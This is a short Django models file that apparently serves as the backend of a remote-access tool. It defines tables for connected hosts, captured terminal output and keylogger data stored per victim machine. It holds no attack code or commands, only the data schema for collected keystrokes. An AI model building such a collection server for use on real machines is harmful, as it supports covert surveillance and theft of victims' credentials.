from django.db import models

# Create your models here.

class HostConnection(models.Model):
    identifier = models.CharField(max_length=200, blank=True, null=True)
    os = models.CharField(max_length=100, null=True, blank=True)
    connected_at = models.DateTimeField(auto_now=True, blank=True, null=True)

    def __str__(self):
        return self.identifier
    


class Host(models.Model):
    hostname = models.CharField(max_length=100, null=True, blank=True)
    identifier = models.CharField(max_length=200, blank=True, null=True)
    os = models.CharField(max_length=100, null=True, blank=True)
    ip = models.CharField(max_length=100, null=True, blank=True)
    port = models.CharField(max_length=10, null=True, blank=True)
    connected_at = models.DateTimeField(auto_now=True, blank=True, null=True)

    def __str__(self):
        return self.hostname
    


class TerminalData(models.Model):
    host = models.ForeignKey(Host, on_delete=models.CASCADE, blank=True, null=True)
    terminal = models.TextField(null=True, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    
    def __str__(self):
        return self.host.hostname



class KeyloggerData(models.Model):
    host = models.ForeignKey(Host, on_delete=models.CASCADE, blank=True, null=True)
    keylogs = models.TextField(null=True, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    
    def __str__(self):
        return self.host.hostname